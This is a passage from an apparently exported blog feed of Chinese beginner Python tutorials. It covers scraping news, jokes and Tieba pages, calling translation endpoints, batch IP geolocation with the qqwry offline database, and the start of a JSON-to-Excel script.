class="params">self,json_str</span>):</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;36kr.json&quot;</span>,<span class="string">&quot;w&quot;</span>,encoding=<span class="string">&quot;utf8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(json.dumps(json_str,ensure_ascii=<span class="literal">False</span>,indent=<span class="number">2</span>)) <span class="comment">#以格式化写入json数据。为了输出好看的格式，依然是先json.loads，再json.dumps，关键就是要用json.dumps的格式化方法</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment">#1. 获取url</span></span><br><span class="line">        <span class="comment">#2. 发送请求，获取响应</span></span><br><span class="line">        html_str = self.parse(self.url,self.headers)</span><br><span class="line">        <span class="comment">#3. 提取数据</span></span><br><span class="line">        json_str = self.get_content(html_str)</span><br><span class="line">        <span class="comment">#4. 保存数据</span></span><br><span class="line">        self.save_content(json_str)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    my_kr = kr()</span><br><span class="line">    my_kr.run()</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>为了输出好看的json格式文件，就要用<code>json.dumps</code>方法。使用这个方法，就得兜圈子，先把json转换为python数据类型，再把python数据类型转换为格式化的json字符串，写入文件并保存。</p>
]]></content>
      <categories>
        <category>python爬虫实例</category>
      </categories>
      <tags>
        <tag>python爬虫实例</tag>
        <tag>正则表达式使用</tag>
        <tag>爬取36kr新闻</tag>
        <tag>json数据格式化</tag>
      </tags>
  </entry>
  <entry>
    <title>python爬虫实例之用xpath提取段子</title>
    <url>//posts/ZH-CN/Python_Spider_Xpath_Funny.html</url>
    <content><![CDATA[<h2 id="爬什么"><a href="#爬什么" class="headerlink" title="爬什么"></a>爬什么</h2><p>把百思不得姐网站的所有段子爬取下来，并保存到本地。本来是要爬内涵段子的，可惜访问不到这个网站了。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="怎么做"><a href="#怎么做" class="headerlink" title="怎么做"></a>怎么做</h2><p>爬虫基本思路：</p>
<ul>
<li>获取url序列</li>
<li>遍历url序列<ul>
<li>提取数据</li>
<li>保存数据</li>
</ul>
</li>
</ul>
<h3 id="获取url序列"><a href="#获取url序列" class="headerlink" title="获取url序列"></a>获取url序列</h3><p>首先进入网站，寻找url的规律。最后发现每一页内容对应的url都是有规律的：（现在找到了url规律，可获取url序列）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第1页：http://www.budejie.com/1</span><br><span class="line">第2页：http://www.budejie.com/2</span><br><span class="line">第3页：http://www.budejie.com/3</span><br><span class="line">……</span><br><span class="line">第50页：http://www.budejie.com/50</span><br><span class="line">总共就50页内容</span><br></pre></td></tr></table></figure>

<h3 id="提取数据"><a href="#提取数据" class="headerlink" title="提取数据"></a>提取数据</h3><p>寻找目标数据，发现目标数据在响应的html内容里面，所在位置存在规律。于是使用xpath提取数据，这种方式最简单。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb4d69b1t6j31f60u0wju.jpg" alt="image.png"></p>
<h3 id="保存数据"><a href="#保存数据" class="headerlink" title="保存数据"></a>保存数据</h3><p>用追加的方式写入数据。<br><code>with open(&quot;duanzi.txt&quot;,&quot;a&quot;,encoding=&quot;utf8&quot;) as f:</code></p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">from</span> pprint <span class="keyword">import</span> pprint</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">duanzi</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.url_temp = <span class="string">&quot;http://www.budejie.com/&#123;&#125;&quot;</span></span><br><span class="line">        self.headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_url_list</span>(<span class="params">self,url_temp</span>):</span></span><br><span class="line">        url_list = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>): <span class="comment">#一共有50页内容</span></span><br><span class="line">            url_list.append(self.url_temp.<span class="built_in">format</span>(i+<span class="number">1</span>)) </span><br><span class="line">        <span class="keyword">return</span> url_list</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse_url</span>(<span class="params">self,url,headers</span>):</span> <span class="comment">#发送请求，获取响应</span></span><br><span class="line">        response = requests.get(url,headers=self.headers)</span><br><span class="line">        <span class="keyword">return</span> response.content.decode()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_content</span>(<span class="params">self,html_str</span>):</span> <span class="comment">#使用xpath提取数据</span></span><br><span class="line">        html_element = etree.HTML(html_str)</span><br><span class="line">        content_list = html_element.xpath(<span class="string">&quot;//div[@class=&#x27;j-r-list-c-desc&#x27;]/a/text()&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> content_list</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span> <span class="comment">#实现主逻辑</span></span><br><span class="line">        <span class="comment">#1. 获取url列表</span></span><br><span class="line">        url_list = self.get_url_list(self.url_temp)</span><br><span class="line">        <span class="comment"># print(url_list)</span></span><br><span class="line">        <span class="comment">#2. 遍历url列表</span></span><br><span class="line">        <span class="keyword">for</span> url <span class="keyword">in</span> url_list:            </span><br><span class="line">            <span class="comment">#3. 发送请求，获取响应</span></span><br><span class="line">            html_str = self.parse_url(url,headers=self.headers)           </span><br><span class="line">            <span class="comment">#3. 提取数据</span></span><br><span class="line">            content_list = self.get_content(html_str) </span><br><span class="line">            <span class="comment"># pprint(content_list)</span></span><br><span class="line">            <span class="comment">#4. 保存</span></span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;duanzi.txt&quot;</span>,<span class="string">&quot;a&quot;</span>,encoding=<span class="string">&quot;utf8&quot;</span>) <span class="keyword">as</span> f: <span class="comment">#以追加的方式写入文件</span></span><br><span class="line">                f.write(<span class="built_in">str</span>(content_list)) <span class="comment">#将列表强制转换为str类型</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    my_duanzi = duanzi()</span><br><span class="line">    my_duanzi.run()</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这是本人第一次独立使用面向对象的方法搞出的代码，还是开心滴~<br>本来打算把获取的列表构造成字典，然后用json.dumps的方式写入文件保存（这样就可以使抓取结果显示得更美观）。但是现在段位太低，还不知道怎么做。</p>
<h2 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h2><p>找到方法格式化保存了，没错，就是使用json.dumps这个方法。不需要把获取的列表转换为字典~因为json.dumps的作用就是可以把python数据类型转换为字符串类型，列表就是一种python数据类型，可以直接使用json.dumps<br>代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">from</span> pprint <span class="keyword">import</span> pprint</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">duanzi</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.url_temp = <span class="string">&quot;http://www.budejie.com/&#123;&#125;&quot;</span></span><br><span class="line">        self.headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_url_list</span>(<span class="params">self,url_temp</span>):</span></span><br><span class="line">        url_list = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>): <span class="comment">#一共有50页内容</span></span><br><span class="line">            url_list.append(self.url_temp.<span class="built_in">format</span>(i+<span class="number">1</span>)) </span><br><span class="line">        <span class="keyword">return</span> url_list</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse_url</span>(<span class="params">self,url,headers</span>):</span> <span class="comment">#发送请求，获取响应</span></span><br><span class="line">        response = requests.get(url,headers=self.headers)</span><br><span class="line">        <span class="keyword">return</span> response.content.decode()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_content</span>(<span class="params">self,html_str</span>):</span> <span class="comment">#使用xpath提取数据</span></span><br><span class="line">        html_element = etree.HTML(html_str)</span><br><span class="line">        content_list = html_element.xpath(<span class="string">&quot;//div[@class=&#x27;j-r-list-c-desc&#x27;]/a/text()&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> content_list</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span> <span class="comment">#实现主逻辑</span></span><br><span class="line">        <span class="comment">#1. 获取url列表</span></span><br><span class="line">        url_list = self.get_url_list(self.url_temp)</span><br><span class="line">        <span class="comment"># print(url_list)</span></span><br><span class="line">        <span class="comment">#2. 遍历url列表</span></span><br><span class="line">        <span class="keyword">for</span> url <span class="keyword">in</span> url_list:            </span><br><span class="line">            <span class="comment">#3. 发送请求，获取响应</span></span><br><span class="line">            html_str = self.parse_url(url,headers=self.headers)           </span><br><span class="line">            <span class="comment">#3. 提取数据</span></span><br><span class="line">            content_list = self.get_content(html_str) </span><br><span class="line">            <span class="comment"># pprint(content_list)</span></span><br><span class="line">            <span class="comment">#4. 保存</span></span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;duanzi.txt&quot;</span>,<span class="string">&quot;a&quot;</span>,encoding=<span class="string">&quot;utf8&quot;</span>) <span class="keyword">as</span> f: <span class="comment">#以追加的方式写入文件</span></span><br><span class="line">                <span class="keyword">for</span> content <span class="keyword">in</span> content_list: <span class="comment">#这里优化了，遍历段子内容，依次格式化写入文件并保存</span></span><br><span class="line">                    f.write(json.dumps(content,ensure_ascii=<span class="literal">False</span>,indent=<span class="number">2</span>)) <span class="comment">#嘻嘻嘻，可以使用json.dumps方式格式化写入文件~</span></span><br><span class="line">                    f.write(<span class="string">&quot;\n&quot;</span>) <span class="comment">#添加换行符，一个段子就占一行</span></span><br><span class="line">                <span class="comment"># f.write(str(content_list)) #将列表强制转换为str类型</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    my_duanzi = duanzi()</span><br><span class="line">    my_duanzi.run()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>python爬虫实例</category>
      </categories>
      <tags>
        <tag>python爬虫实例</tag>
        <tag>xpath使用</tag>
        <tag>DIY</tag>
      </tags>
  </entry>
  <entry>
    <title>python爬虫实例之百度贴吧爬虫</title>
    <url>//posts/ZH-CN/Python_Baidu_Spider.html</url>
    <content><![CDATA[<h2 id="爬什么"><a href="#爬什么" class="headerlink" title="爬什么"></a>爬什么</h2><p>把李毅吧的网页爬取下来，并保存到本地。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="怎么做"><a href="#怎么做" class="headerlink" title="怎么做"></a>怎么做</h2><p>url的规律是：按程序员的计数习惯，第一页就是第0页。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第0页内容 pn=0</span><br><span class="line">第1页内容 pn=50</span><br><span class="line">第2页内容 pn=100</span><br><span class="line">……</span><br><span class="line">第i页内容 Pn=50*i</span><br></pre></td></tr></table></figure>
<p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb0wzbqdqnj31f60u0jx4.jpg" alt="image.png"></p>
<p>代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">tieba_spider</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,tieba_name</span>):</span></span><br><span class="line">        self.tieba_name = tieba_name</span><br><span class="line">        self.url_temp = <span class="string">&quot;https://tieba.baidu.com/f?kw=&quot;</span>+tieba_name+<span class="string">&quot;&amp;ie=utf-8&amp;pn=&#123;&#125;&quot;</span></span><br><span class="line">        self.headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Mobile Safari/537.36&quot;</span>&#125;</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_url_list</span>(<span class="params">self</span>):</span> <span class="comment">#1. 构造url序列</span></span><br><span class="line">        url_list = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">            url_list.append(self.url_temp.<span class="built_in">format</span>(i*<span class="number">50</span>)) <span class="comment">#format就是这么万能~</span></span><br><span class="line">        <span class="keyword">return</span> url_list</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse_url</span>(<span class="params">self,url</span>):</span> <span class="comment">#2. 发送请求，获取响应页面</span></span><br><span class="line">        r = requests.get(url,headers=self.headers)</span><br><span class="line">        <span class="built_in">print</span>(url)</span><br><span class="line">        <span class="keyword">return</span> r.content.decode()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">save_html</span>(<span class="params">self,html_str,page_num</span>):</span> <span class="comment">#3. 保存数据至本地</span></span><br><span class="line">        file_path = <span class="string">&quot;&#123;&#125;-第&#123;&#125;页.html&quot;</span>.<span class="built_in">format</span>(self.tieba_name,page_num) <span class="comment">#format就是这么万能~</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_path,<span class="string">&quot;w&quot;</span>,encoding=<span class="string">&quot;utf8&quot;</span>) <span class="keyword">as</span> f:  <span class="comment">#注意这个地方，写入文件要加上编码方法，否则会出现乱码</span></span><br><span class="line">            f.write(html_str)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span> <span class="comment">#实现主逻辑</span></span><br><span class="line">        <span class="comment">#1. 构造url序列</span></span><br><span class="line">        url_list = self.get_url_list()</span><br><span class="line">        <span class="comment">#2. 遍历url序列，发送请求，获取响应页面</span></span><br><span class="line">        <span class="keyword">for</span> url <span class="keyword">in</span> url_list:</span><br><span class="line">            html_str = self.parse_url(url)</span><br><span class="line">            <span class="comment">#3. 保存数据至本地</span></span><br><span class="line">            page_num = url_list.index(url)+<span class="number">1</span> <span class="comment">#页码数</span></span><br><span class="line">            self.save_html(html_str,page_num)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    tieba_name = <span class="string">&quot;李毅&quot;</span></span><br><span class="line">    my_tieba_spider = tieba_spider(tieba_name)</span><br><span class="line">    my_tieba_spider.run()</span><br></pre></td></tr></table></figure>
<ul>
<li>乱码问题<br>写入文件这个操作，需要加上编码方法，<code>&quot;encoding=utf8&quot;</code>，解决以下乱码问题<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb0wsir1myj30xu06it9b.jpg" alt="image.png"></li>
</ul>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li>灵活应用万能的format</li>
<li>列表元素的位置，可使用<code>list.index(&quot;元素1&quot;)</code>来表示。<code>list = [&quot;元素1&quot;,&quot;元素2&quot;]</code></li>
</ul>
]]></content>
      <categories>
        <category>python爬虫实例</category>
      </categories>
      <tags>
        <tag>python爬虫实例</tag>
        <tag>百度贴吧爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>python爬虫实例之第一阶段总结</title>
    <url>//posts/ZH-CN/Python_SPider_FirstStage_Summary.html</url>
    <content><![CDATA[<h2 id="知识树"><a href="#知识树" class="headerlink" title="知识树"></a>知识树</h2><p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb4ni0zutoj31v326l7cw.jpg" alt="python爬虫实例（一）.png"></p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="主要内容"><a href="#主要内容" class="headerlink" title="主要内容"></a>主要内容</h2><p>主要就是学习爬虫的思路，以及多线程爬虫。多线程爬虫值得学习，可以高效爬取数据。<br>现阶段都是把爬取的数据保存到本地，以后重点学习把爬取结果存到数据库（数据库目前只接触过mysql、oracle，oracle仅仅是碰了一点，mysql稍微熟悉一点）。教程会重点教我们把数据存到mangodb。啥都碰点就对了。</p>
]]></content>
      <categories>
        <category>python爬虫实例</category>
        <category>基础知识大漫灌</category>
      </categories>
      <tags>
        <tag>python爬虫实例</tag>
        <tag>学习总结</tag>
      </tags>
  </entry>
  <entry>
    <title>python爬虫实例之翻译接口</title>
    <url>//posts/ZH-CN/Python_Spider_Translation_Api.html</url>
    <content><![CDATA[<h2 id="爬什么"><a href="#爬什么" class="headerlink" title="爬什么"></a>爬什么</h2><p>使用翻译接口，用python代码做一个翻译小工具。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="先练习用requests发送post请求"><a href="#先练习用requests发送post请求" class="headerlink" title="先练习用requests发送post请求"></a>先练习用requests发送post请求</h2><p>本来是要用百度翻译接口，获取post响应，但是百度这个接口的post数据包含了sign这个变化的键值，对初学者不太友好。为了体验requests发送post请求获取数据的用法，就找了有道的翻译接口。这是不是也从侧面反应了有道和百度的差距。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb0riselrfj31f60u0jwa.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb0rkaglkoj31f60u0te0.jpg" alt="image.png"><br>代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = &#123;<span class="string">&quot;inputtext&quot;</span>: <span class="string">&quot;下雨了&quot;</span>,</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;AUTO&quot;</span>&#125;</span><br><span class="line">headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Mobile Safari/537.36&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(<span class="string">&quot;http://m.youdao.com/translate&quot;</span>,data=data,headers=headers)</span><br></pre></td></tr></table></figure>
<p>运行结果：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb0rm7yxkfj317f0f0wjf.jpg" alt="image.png"></p>
<h2 id="找到一个适合初级玩家的翻译接口"><a href="#找到一个适合初级玩家的翻译接口" class="headerlink" title="找到一个适合初级玩家的翻译接口*"></a>找到一个适合初级玩家的翻译接口*</h2><p>360翻译接口，类似于百度翻译接口。可以用来练习json串处理。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb0suwiryuj31f60u0793.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb0sw4uhl2j31f60u0tdc.jpg" alt="image.png"><br>代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">&quot;eng&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;query&quot;</span>: <span class="string">&quot;下雨了&quot;</span>&#125;</span><br><span class="line">headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Mobile Safari/537.36&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(<span class="string">&quot;https://fanyi.so.com/index/search&quot;</span>,data=data,headers=headers)</span><br><span class="line">result = json.loads(r.content.decode())[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;fanyi&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
<p>对json串处理一下，取翻译结果：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb0t2fu496j31780jk40w.jpg" alt="image.png"></p>
<h2 id="输入任意中文，自动翻译为英文"><a href="#输入任意中文，自动翻译为英文" class="headerlink" title="输入任意中文，自动翻译为英文"></a>输入任意中文，自动翻译为英文</h2><p>不知道这个网站识别输入语言的方式是什么，从url请求看不出来。暂时就做一个中译英的小工具。<br>太不容易辽！终于把这个代码弄出来了~~</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fanyi</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,trans_str</span>):</span> <span class="comment">#1. 准备post的url和post_data</span></span><br><span class="line">        self.trans_str = trans_str</span><br><span class="line">        self.headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Mobile Safari/537.36&quot;</span>&#125;</span><br><span class="line">        self.trans_url = <span class="string">&quot;https://fanyi.so.com/index/search&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse_url</span>(<span class="params">self,url,data</span>):</span> <span class="comment">#2. 发送post请求，获取响应</span></span><br><span class="line">        r = requests.post(url,data=data,headers=self.headers)</span><br><span class="line">        <span class="keyword">return</span> json.loads(r.content.decode())</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_result</span>(<span class="params">self,<span class="built_in">dict</span></span>):</span> <span class="comment">#3. 提取翻译结果</span></span><br><span class="line">        result = <span class="built_in">dict</span>[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;fanyi&quot;</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;result is :&quot;</span>,result)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment">#1. 准备post的url和post_data</span></span><br><span class="line">        post_data = &#123;<span class="string">&quot;eng&quot;</span>: <span class="string">&quot;0&quot;</span>,<span class="string">&quot;query&quot;</span>: self.trans_str&#125;</span><br><span class="line">        <span class="comment">#2. 发送post请求，获取响应</span></span><br><span class="line">        <span class="built_in">dict</span> = self.parse_url(self.trans_url,post_data)</span><br><span class="line">        <span class="comment">#3. 提取翻译结果</span></span><br><span class="line">        self.get_result(<span class="built_in">dict</span>)      </span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>: <span class="comment">#这貌似就是主函数</span></span><br><span class="line">    trans_str = sys.argv[<span class="number">1</span>] <span class="comment">#执行这个程序必须带上一个参数，这个参数就是需要翻译的中文</span></span><br><span class="line">    my_fanyi = fanyi(trans_str)</span><br><span class="line">    my_fanyi.run()</span><br></pre></td></tr></table></figure>
<p>依葫芦画瓢，用这种抽象的方式把这个简单的功能做出来了。这种方式比较好，先明白自己要做的事情分几步，然后一步一步做。以后就按照这种结构来写。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb0u8ydc0oj30yy036weq.jpg" alt="image.png"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>复杂的任务可以拆解。递归是多么伟大的思想。大象放冰箱只需要三步。<br>复杂的世界也是由许多简单的规律组成。</p>
]]></content>
      <categories>
        <category>python爬虫实例</category>
      </categories>
      <tags>
        <tag>python爬虫实例</tag>
        <tag>翻译接口</tag>
      </tags>
  </entry>
  <entry>
    <title>python脚本+qqwry纯真离线IP库实现批量查询IP归属地</title>
    <url>//posts/ZH-CN/Python_Qqwry_IP_Query.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>工作上需要批量查询IP归属，但是在线接口有访问频率限制，查询频次一增加就获取不到结果。于是在网上找到了纯真离线IP信息库，可实现本地查询。结合python脚本，可实现快速批量查询IP归属地。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="怎么做"><a href="#怎么做" class="headerlink" title="怎么做"></a>怎么做</h2><h3 id="下载纯真离线IP信息库"><a href="#下载纯真离线IP信息库" class="headerlink" title="下载纯真离线IP信息库"></a>下载纯真离线IP信息库</h3><p>在<a href="https://github.com/out0fmemory/qqwry.dat/blob/master/qqwry_lastest.dat">github</a>下载最新的离线IP信息库。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gclh39n6gdj31f60u0gsi.jpg" alt="image.png"></p>
<h3 id="安装qqwry-py3"><a href="#安装qqwry-py3" class="headerlink" title="安装qqwry-py3"></a>安装qqwry-py3</h3><p>安装命令：<code>pip3 install qqwry-py3</code><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gclh5wvx8oj31f60u0jvc.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gclh7457vdj30xz0hrgmn.jpg" alt="image.png"></p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> qqwry <span class="keyword">import</span> QQwry</span><br><span class="line">q = QQwry()</span><br><span class="line">q.load_file(<span class="string">&#x27;qqwry_lastest.dat&#x27;</span>)</span><br><span class="line"></span><br><span class="line">data = <span class="built_in">open</span>(<span class="string">&#x27;ip.txt&#x27;</span>)</span><br><span class="line">data1 = data.readlines()</span><br><span class="line">ipresult = <span class="built_in">open</span>(<span class="string">&#x27;jieguo.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data1:</span><br><span class="line">    result = q.lookup(i.strip())</span><br><span class="line">    city = result[<span class="number">0</span>]</span><br><span class="line">    typenet = result[<span class="number">1</span>]</span><br><span class="line">    ipresult.write(i.strip()+<span class="string">&#x27;\t&#x27;</span> + city + <span class="string">&#x27;\t&#x27;</span> + typenet + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">ipresult.close()</span><br></pre></td></tr></table></figure>
<h2 id="参考博文"><a href="#参考博文" class="headerlink" title="参考博文"></a>参考博文</h2><p><a href="https://zhuanlan.zhihu.com/p/53295301">https://zhuanlan.zhihu.com/p/53295301</a></p>
]]></content>
      <categories>
        <category>python小工具</category>
      </categories>
      <tags>
        <tag>批量查询IP归属地</tag>
        <tag>qqwry纯真离线IP库</tag>
        <tag>python脚本</tag>
      </tags>
  </entry>
  <entry>
    <title>python读取复杂json并取值</title>
    <url>//posts/ZH-CN/python-read-complex-json.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>工作中需要读取复杂json，并取需要的值写入excel，整理配置。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8-*- #</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> xlwt</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">book = xlwt.Workbook(encoding=<span class="string">&#x27;GBK&#x27;</span>,style_compression=<span class="number">0</span>)</span><br><span class="line">sheet = book.add_sheet(<span class="string">&#x27;XX&#x27;</span>, cell_overwrite_ok=<span class="literal">True</span>)</span><br><span class="line">sheet.write(<span class="number">0</span>, <span class="number">0</span>, <span class="string">&#x27;所属集群&#x27;</span>) </span><br><span class="line">sheet.write(<span class="number">0</span>, <span class="number">1</span>, <span class="string">&#x27;系统名称&#x27;</span>) </span><br><span class="line">sheet.write(<span class="number">0</span>, <span class="number">2</span>, <span class="string">&#x27;请求白名单&#x27;</span>)</span><br><span class="line">sheet.write(<span class="number">0</span>, <span class="number">3</span>, <span class="string">&#x27;响应白名单&#x27;</span>)</span><br><span class="line">sheet.write(<span class="number">0</span>, <span class="number">4</span>, <span class="string">&#x27;WAF白名单&#x27;</span>)</span><br><span class="line">sheet.write(<span class="number">0</span>, <span class="number">5</span>, <span class="string">&#x27;封装名单&#x27;</span>)</span><br><span class="line">sheet.write(<span 